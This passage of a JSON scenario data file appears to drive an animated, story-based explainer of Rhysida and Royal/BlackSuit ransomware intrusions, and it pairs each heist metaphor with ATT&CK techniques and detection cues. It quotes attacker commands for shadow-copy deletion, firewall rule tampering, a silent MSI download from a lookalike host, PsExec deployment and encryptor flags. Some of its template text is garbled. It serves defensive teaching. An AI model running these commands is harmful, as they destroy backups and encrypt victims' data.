          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "rhysida-ransomware-zerologon-ps-silentskill",
      "sectionKey": "step-1",
      "sceneKind": "ran-rhysida-step-1",
      "stageBadge": "STEP #1 · PERSISTENCE",
      "title": "PortStarter Golang Backdoor & Windows Firewall Rule Tampering",
      "storyCue": "Right after slipping inside the perimeter, the crew hides a compact custom courier engine inside a shared utility closet and commands the building own firewall guard to cut a fresh permanent doorway for incoming traffic.",
      "technicalCue": "T1562.004 · PERSISTENCE — After initial VPN or credential access, the operator installed PortStarter (a custom Golang backdoor shared between Vice Society and Rhysida affiliates that registers itself as a Windows…",
      "storyMappings": [
        {
          "storyTerm": "Compact custom courier engine in a utility closet",
          "technicalTerm": "PortStarter custom Golang backdoor staged under C:\\ProgramData",
          "tone": "amber"
        },
        {
          "storyTerm": "Commanding the firewall guard to cut a fresh doorway",
          "technicalTerm": "netsh.exe advfirewall firewall add rule opening attacker listening ports",
          "tone": "sky"
        },
        {
          "storyTerm": "Building perimeter fence audit log",
          "technicalTerm": "Windows Firewall EventID 2004 logging unauthorized rule additions",
          "tone": "rose"
        },
        {
          "storyTerm": "Cross-crew shared burglary tool",
          "technicalTerm": "Shared PortStarter backdoor infrastructure linking Rhysida and Vice Society",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-rhysida-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Compact custom courier engine in a…",
          "subtitle": "PortStarter custom Golang backdoor staged under C:\\ProgramData",
          "tone": "amber"
        },
        {
          "id": "ran-rhysida-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Commanding the firewall guard to cut a…",
          "subtitle": "netsh.exe advfirewall firewall add rule opening attacker…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Crew Own",
          "stageTag": "STEP 01 · SETUP",
          "title": "Compact custom courier engine in a utility closet",
          "storyExcerpt": "Right after slipping inside the perimeter, the crew hides a compact custom courier engine inside a shared utility closet and commands the building own firewall guard to cut a fresh permanent…",
          "technicalParallel": "The shared use of PortStarter and SilentKill provided high-confidence forensic proof that Vice Society (DEV-0832) operators transitioned directly to the Rhysida ransomware payload in mid-2023.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Cut",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Commanding the firewall guard to cut a fresh doorway",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses commanding the firewall guard to cut a fresh doorway to advance toward building perimeter fence audit log.",
          "technicalParallel": "After initial VPN or credential access, the operator installed PortStarter (a custom Golang backdoor shared between Vice Society and Rhysida affiliates that registers itself as a Windows service and…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tool",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Cross-crew shared burglary tool",
          "storyExcerpt": "Behind the scenes, cross-crew shared burglary tool captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Alert on Sysmon EventID 1 (Process Creation) when unsigned Golang binaries in C:\\ProgramData spawn netsh.exe advfirewall firewall add rule alongside Windows Firewall Operational EventID 2004 (which…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fence Hole",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Lock Press",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Multi-Lane",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.004"
    },
    "step-2": {
      "scenarioId": "rhysida-ransomware-zerologon-ps-silentskill",
      "sectionKey": "step-2",
      "sceneKind": "ran-rhysida-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "SilentKill PowerShell Script (g.ps1) Disabling 200+ Services & Unhooking AMSI",
      "storyCue": "Before locking a single vault, the crew fires a sweeping silence script that first blinds the script-inspection window, switches off more than two hundred database and backup services so every file lock releases, and alters a security bolt so stolen badge hashes work straight at remote desks.",
      "technicalCue": "T1562.001 · DEFENSE EVASION — To prepare the environment for unobstructed encryption, the operator ran SilentKill (g.ps1), which first patched AmsiScanBuffer in amsi.dll memory, iterated through a hardcoded list of over 200…",
      "storyMappings": [
        {
          "storyTerm": "Blinding the script-inspection window first",
          "technicalTerm": "SilentKill (g.ps1) patching AMSI in memory before executing payload commands",
          "tone": "amber"
        },
        {
          "storyTerm": "Switching off two hundred database and backup services",
          "technicalTerm": "PowerShell service-termination loops stopping SQL, backup, and AV services",
          "tone": "sky"
        },
        {
          "storyTerm": "Altering the security bolt for stolen badge hashes",
          "technicalTerm": "Registry write modifying HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin",
          "tone": "rose"
        },
        {
          "storyTerm": "Verbatim transcript caught by script cameras",
          "technicalTerm": "PowerShell Operational EventID 4104 capturing SilentKill deobfuscated commands",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-rhysida-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Blinding the script-inspection window…",
          "subtitle": "SilentKill (g.ps1) patching AMSI in memory before executing…",
          "tone": "amber"
        },
        {
          "id": "ran-rhysida-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Switching off two hundred database and…",
          "subtitle": "PowerShell service-termination loops stopping SQL, backup, and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Crew Off",
          "stageTag": "STEP 02 · SETUP",
          "title": "Blinding the script-inspection window first",
          "storyExcerpt": "Before locking a single vault, the crew fires a sweeping silence script that first blinds the script-inspection window, switches off more than two hundred database and backup services so every…",
          "technicalParallel": "Enabling DisableRestrictedAdmin = 0 across the domain allows the operator to Pass-the-Hash over RDP (mstsc.exe /restrictedadmin) without exposing their own cleartext credentials on target hosts.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Off Two",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Switching off two hundred database and backup services",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses switching off two hundred database and backup services to advance toward altering the security bolt for stolen badge hashes.",
          "technicalParallel": "To prepare the environment for unobstructed encryption, the operator ran SilentKill (g.ps1), which first patched AmsiScanBuffer in amsi.dll memory, iterated through a hardcoded list of over 200 Windows…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Bolt",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Verbatim transcript caught by script cameras",
          "storyExcerpt": "Behind the scenes, verbatim transcript caught by script cameras captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Monitor PowerShell EventID 4104 (ScriptBlock Logging recording full runtime script contents) for SilentKill mass service-termination loops correlated with Sysmon EventID 13 (RegistryValueSet)…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fence Hole",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Lock Press",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Multi-Lane",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.001"
    },
    "step-3": {
      "scenarioId": "rhysida-ransomware-zerologon-ps-silentskill",
      "sectionKey": "step-3",
      "sceneKind": "ran-rhysida-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "Multi-Threaded LibTomCrypt AES-256-CTR Encryption & Desktop Wallpaper Lock (.rhysida)",
      "storyCue": "Pushing their heavy padlocking press down every hallway simultaneously via the remote-service tool, the crew runs parallel locking gears across every office cabinet, stamps a bright ransom notice onto every screen, and drops printed extortion booklets in every folder.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Pushed domain-wide via psexec.exe -d -s, the 64-bit MinGW-compiled rhysida.exe binary invoked its statically linked LibTomCrypt v1.18.2 cryptographic library (aes_setup and ctr_start in…",
      "storyMappings": [
        {
          "storyTerm": "Pushing the padlocking press down every hallway",
          "technicalTerm": "Domain-wide execution via psexec.exe -d -s launching 64-bit MinGW rhysida.exe",
          "tone": "amber"
        },
        {
          "storyTerm": "Parallel locking gears sealing every cabinet",
          "technicalTerm": "Multi-threaded statically linked LibTomCrypt AES-256-CTR file encryption",
          "tone": "sky"
        },
        {
          "storyTerm": "Bright ransom notice stamped on every screen",
          "technicalTerm": "Forced desktop wallpaper lock paired with .rhysida file extensions",
          "tone": "rose"
        },
        {
          "storyTerm": "Printed extortion booklets dropped in every folder",
          "technicalTerm": "CriticalBreachDetected.pdf ransom demand files generated across directories",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-rhysida-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Pushing the padlocking press down every…",
          "subtitle": "Domain-wide execution via psexec.exe -d -s launching 64-bit…",
          "tone": "amber"
        },
        {
          "id": "ran-rhysida-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Parallel locking gears sealing every…",
          "subtitle": "Multi-threaded statically linked LibTomCrypt AES-256-CTR file…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Down",
          "stageTag": "STEP 03 · SETUP",
          "title": "Pushing the padlocking press down every hallway",
          "storyExcerpt": "Pushing their heavy padlocking press down every hallway simultaneously via the remote-service tool, the crew runs parallel locking gears across every office cabinet, stamps a bright ransom…",
          "technicalParallel": "Unlike most ransomware families that drop .txt or .hta ransom notes, Rhysida generates a standalone .pdf document (CriticalBreachDetected.pdf) in every encrypted directory.",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Parallel locking gears sealing every cabinet",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses parallel locking gears sealing every cabinet to advance toward bright ransom notice stamped on every screen.",
          "technicalParallel": "Pushed domain-wide via psexec.exe -d -s, the 64-bit MinGW-compiled rhysida.exe binary invoked its statically linked LibTomCrypt v1.18.2 cryptographic library (aes_setup and ctr_start in AES-256-CTR mode…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Down Tool",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Printed extortion booklets dropped in every folder",
          "storyExcerpt": "Behind the scenes, printed extortion booklets dropped in every folder captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Deploy YARA memory and file signatures matching statically linked LibTomCrypt constants inside MinGW-compiled PE binaries (identifying Rhysida encryptors even when repacked) paired with EDR alerts on…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fence Hole",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Lock Press",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Multi-Lane",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "royal-blacksuit-ransomware-chacha20-restartmanager": {
    "briefing": {
      "scenarioId": "royal-blacksuit-ransomware-chacha20-restartmanager",
      "sectionKey": "briefing",
      "sceneKind": "ran-royal-blacksuit-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1219",
      "title": "Royal & BlackSuit Ransomware: Callback Phishing, Windows Restart Manager… — Story-to-Technical Overview",
      "storyCue": "Imagine a burglar crew that lures an office worker into calling a fake subscription-cancellation hotline so the worker willingly installs a remote-support doorway, threads a quiet reverse tunnel back to the crew hideout, uses the building own gentle maintenance-restart clerk to ask busy workers to let go of locked ledgers politely, and then locks an operator-chosen percentage of every file across the building at blistering speed.",
      "technicalCue": "INITIAL ACCESS: Callback Phishing / BatLoader RMM Delivery & Chisel Reverse Tunneling -> EXFIL & IMPACT: vssadmin Shadow Wipe & Windows Restart Manager (RstrtMgr.dll) File Lock Release -> EXFIL & IMPACT: OpenSSL AES-256-CBC Percentage-Based Partial Encryption (-ep) Across Shares",
      "storyMappings": [
        {
          "storyTerm": "Fake cancellation hotline tricking a worker into opening a remote doorway",
          "technicalTerm": "Callback phishing / BatLoader delivering commercial RMM and Chisel reverse tunnel",
          "tone": "amber"
        },
        {
          "storyTerm": "Building gentle maintenance-restart clerk releasing locked ledgers",
          "technicalTerm": "Windows Restart Manager API (RstrtMgr.dll) closing processes holding open file handles",
          "tone": "sky"
        },
        {
          "storyTerm": "Shredding backup recovery binders first",
          "technicalTerm": "vssadmin.exe Volume Shadow Copy deletion prior to encryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Locking an operator-chosen percentage of every file across parallel lanes",
          "technicalTerm": "OpenSSL AES-256-CBC partial encryption controlled by -ep percentage over 2x-CPU IOCP threads",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-royal-blacksuit-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Fake cancellation hotline tricking a…",
          "subtitle": "Callback phishing / BatLoader delivering commercial RMM and…",
          "tone": "amber"
        },
        {
          "id": "ran-royal-blacksuit-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Building gentle maintenance-restart…",
          "subtitle": "Windows Restart Manager API (RstrtMgr.dll) closing processes…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Fake Call",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Callback Phishing / BatLoader RMM Delivery & Chisel Reverse Tunneling",
          "storyExcerpt": "Sending an alarming fake renewal invoice that begs the employee to call a help desk immediately, the crew talks the employee into installing a commercial remote-management intercom and opens a quiet…",
          "technicalParallel": "Under the hood, the observed step executes msiexec.exe /i \"https://cdn-zoom-update.com/ZoomInstallerFull.msi\" /qn (BatLoader MSI staging) (which executes the technical command / telemetry directive…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Crew All",
          "stageTag": "STAGE 02 · EXFIL & IMPACT",
          "title": "vssadmin Shadow Wipe & Windows Restart Manager (RstrtMgr.dll) File Lock Release",
          "storyExcerpt": "When ready to strike, the crew destroys all backup snapshots and calls upon the building built-in software-update clerk to politely tap every open database and document editor on the shoulder, forcing…",
          "technicalParallel": "Under the hood, the observed step executes vssadmin.exe delete shadows /all /quiet (which executes vssadmin.exe delete shadows /all /quiet , or WMI Win32_ShadowCopy.Delete to invoke…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Many",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "OpenSSL AES-256-CBC Percentage-Based Partial Encryption (-ep) Across Shares",
          "storyExcerpt": "Spinning up twice as many parallel locksmith lanes as the building has processor cores, the crew races across local cabinets and shared network hallways locking only the exact percentage of each large…",
          "technicalParallel": "Under the hood, the observed step executes blacksuit.exe -id 9A4F8C2E1B7D0A3E5F6C8B1D2E3F4A5B -path \"\\\\corp-dc01\\shares\" -ep 50 (which executes the technical command / telemetry directive , blacksuit.exe…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phone Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Locks",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Partial Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "royal-blacksuit-ransomware-chacha20-restartmanager",
      "sectionKey": "step-1",
      "sceneKind": "ran-royal-blacksuit-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Callback Phishing / BatLoader RMM Delivery & Chisel Reverse Tunneling",
      "storyCue": "Sending an alarming fake renewal invoice that begs the employee to call a help desk immediately, the crew talks the employee into installing a commercial remote-management intercom and opens a quiet reverse tunnel straight into the corporate lobby.",
      "technicalCue": "T1219 · INITIAL ACCESS — Royal/BlackSuit affiliates lure employees via subscription-cancellation callback phishing emails or trojanized MSI installers (BatLoader) into launching legitimate remote management tools…",
      "storyMappings": [
        {
          "storyTerm": "Alarming fake renewal invoice urging a phone call",
          "technicalTerm": "Subscription-cancellation callback phishing (TOAD) or trojanized BatLoader SEO lure",
          "tone": "amber"
        },
        {
          "storyTerm": "Commercial remote-management intercom",
          "technicalTerm": "Legitimate RMM tools (AnyDesk, Atera, ScreenConnect) abused for hands-on access",
          "tone": "sky"
        },
        {
          "storyTerm": "Quiet reverse tunnel back to the hideout",
          "technicalTerm": "Chisel encrypted SOCKS reverse tunnel traversing corporate egress firewalls",
          "tone": "rose"
        },
        {
          "storyTerm": "Blending with routine helpdesk work",
          "technicalTerm": "Signed commercial remote-control software evading basic malware blocklists",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-royal-blacksuit-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Alarming fake renewal invoice urging a…",
          "subtitle": "Subscription-cancellation callback phishing (TOAD) or…",
          "tone": "amber"
        },
        {
          "id": "ran-royal-blacksuit-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Commercial remote-management intercom",
          "subtitle": "Legitimate RMM tools (AnyDesk, Atera, ScreenConnect) abused…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Fake Call",
          "stageTag": "STEP 01 · SETUP",
          "title": "Alarming fake renewal invoice urging a phone call",
          "storyExcerpt": "Sending an alarming fake renewal invoice that begs the employee to call a help desk immediately, the crew talks the employee into installing a commercial remote-management intercom and opens a…",
          "technicalParallel": "Under the hood, the observed step executes msiexec.exe /i \"https://cdn-zoom-update.com/ZoomInstallerFull.msi\" /qn (BatLoader MSI staging) (which executes the technical command / telemetry directive…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Back",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Commercial remote-management intercom",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses commercial remote-management intercom to advance toward quiet reverse tunnel back to the hideout.",
          "technicalParallel": "Royal/BlackSuit affiliates lure employees via subscription-cancellation callback phishing emails or trojanized MSI installers (BatLoader) into launching legitimate remote management tools (Syncro…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Back",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Blending with routine helpdesk work",
          "storyExcerpt": "Behind the scenes, blending with routine helpdesk work captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording InitialVector=Callback Phishing / BatLoader MSI, ReconTool=AdFind.exe Active Directory Enumeration, TunnelTool=Chisel SOCKS5 Proxy under T1219): Block unauthorized…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phone Desk",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Locks",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Partial Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1219"
    },
    "step-2": {
      "scenarioId": "royal-blacksuit-ransomware-chacha20-restartmanager",
      "sectionKey": "step-2",
      "sceneKind": "ran-royal-blacksuit-step-2",
      "stageBadge": "STEP #2 · EXFIL & IMPACT",
      "title": "vssadmin Shadow Wipe & Windows Restart Manager (RstrtMgr.dll) File Lock Release",
      "storyCue": "When ready to strike, the crew destroys all backup snapshots and calls upon the building built-in software-update clerk to politely tap every open database and document editor on the shoulder, forcing them to drop their locks on open files so nothing escapes encryption.",
      "technicalCue": "T1489 · EXFIL & IMPACT — Upon execution (royal.exe -id <32_char_id> -ep 50), the binary deletes Volume Shadow Copies via vssadmin.exe and invokes the Windows Restart Manager API (RmStartSession, RmRegisterResources…",
      "storyMappings": [
        {
          "storyTerm": "Destroying all backup snapshots",
          "technicalTerm": "vssadmin.exe delete shadows wiping Windows recovery points",
          "tone": "amber"
        },
        {
          "storyTerm": "Building built-in software-update clerk",
          "technicalTerm": "Windows Restart Manager API (RstrtMgr.dll RmStartSession / RmShutdown)",
          "tone": "sky"
        },
        {
          "storyTerm": "Forcing open editors and databases to drop their file locks",
          "technicalTerm": "Graceful termination of processes holding exclusive handles on target files",
          "tone": "rose"
        },
        {
          "storyTerm": "Custom operator job switch",
          "technicalTerm": "Command-line flags royal.exe -id <32_char_id> -ep 50 configuring encryption depth",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-royal-blacksuit-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Destroying all backup snapshots",
          "subtitle": "vssadmin.exe delete shadows wiping Windows recovery points",
          "tone": "amber"
        },
        {
          "id": "ran-royal-blacksuit-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Building built-in software-update clerk",
          "subtitle": "Windows Restart Manager API (RstrtMgr.dll RmStartSession /…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Crew All",
          "stageTag": "STEP 02 · SETUP",
          "title": "Destroying all backup snapshots",
          "storyExcerpt": "When ready to strike, the crew destroys all backup snapshots and calls upon the building built-in software-update clerk to politely tap every open database and document editor on the shoulder…",
          "technicalParallel": "Under the hood, the observed step executes vssadmin.exe delete shadows /all /quiet (which executes vssadmin.exe delete shadows /all /quiet , or WMI Win32_ShadowCopy.Delete to invoke…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Open",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Building built-in software-update clerk",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses building built-in software-update clerk to advance toward forcing open editors and databases to drop their file locks.",
          "technicalParallel": "Upon execution (royal.exe -id <32_char_id> -ep 50), the binary deletes Volume Shadow Copies via vssadmin.exe and invokes the Windows Restart Manager API (RmStartSession, RmRegisterResources, RmGetList…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Open Drop",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Custom operator job switch",
          "storyExcerpt": "Behind the scenes, custom operator job switch captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Windows Event Log Event 10000 (recording ApiAbused=RstrtMgr.dll , RmStartSession / RmRegisterResources / RmShutdown, EventLogSignature=Microsoft-Windows-RestartManager EventID 10000…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Phone Desk",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Vault Locks",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Partial Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1489"
    },
    "step-3": {
      "scenarioId": "royal-blacksuit-ransomware-chacha20-restartmanager",
      "sectionKey": "step-3",
      "sceneKind": "ran-royal-blacksuit-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "OpenSSL AES-256-CBC Percentage-Based Partial Encryption (-ep) Across Shares",
      "storyCue": "Spinning up twice as many parallel locksmith lanes as the building has processor cores, the crew races across local cabinets and shared network hallways locking only the exact percentage of each large file requested by the operator, finishing the entire building before responders can pull the plug.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Using statically linked OpenSSL routines and a multi-threaded I/O completion port queue (2× CPU core count), Royal/BlackSuit encrypts files using AES-256-CBC and RSA-4096.",
      "storyMappings": [
        {
          "storyTerm": "Twice as many parallel locksmith lanes as processor cores",
          "technicalTerm": "Multi-threaded I/O Completion Port (IOCP) worker queue sized at 2x CPU core count",
          "tone": "amber"
        },
        {
          "storyTerm": "Exact operator-chosen percentage of each large file",
          "technicalTerm": "Configurable -ep partial encryption mode speeding corruption of huge files",
          "tone": "sky"
        },
        {
          "storyTerm": "Built-in standard steel padlock library",
          "technicalTerm": "Statically linked OpenSSL AES-256-CBC routines wrapped with RSA public key",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping across both local cabinets and shared hallways",
          "technicalTerm": "Simultaneous encryption of local drives and reachable SMB network shares",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-royal-blacksuit-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Twice as many parallel locksmith lanes…",
          "subtitle": "Multi-threaded I/O Completion Port (IOCP) worker queue sized…",
          "tone": "amber"
        },
        {
          "id": "ran-royal-blacksuit-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Exact operator-chosen percentage of each…",
          "subtitle": "Configurable -ep partial encryption mode speeding corruption…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Many",
          "stageTag": "STEP 03 · SETUP",
          "title": "Twice as many parallel locksmith lanes as processor…",
          "storyExcerpt": "Spinning up twice as many parallel locksmith lanes as the building has processor cores, the crew races across local cabinets and shared network hallways locking only the exact percentage of…",
          "technicalParallel": "Under the hood, the observed step executes blacksuit.exe -id 9A4F8C2E1B7D0A3E5F6C8B1D2E3F4A5B -path \"\\\\corp-dc01\\shares\" -ep 50 (which executes the technical command / telemetry directive , blacksuit.exe…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Each File",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Exact operator-chosen percentage of each large file",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses exact operator-chosen percentage of each large file to advance toward built-in standard steel padlock library.",
          "technicalParallel": "Using statically linked OpenSSL routines and a multi-threaded I/O completion port queue (2× CPU core count), Royal/BlackSuit encrypts files using AES-256-CBC and RSA-4096.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Both",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Sweeping across both local cabinets and shared…",
          "storyExcerpt": "Behind the scenes, sweeping across both local cabinets and shared hallways captures the unmistakable footprint of the intrusion.",
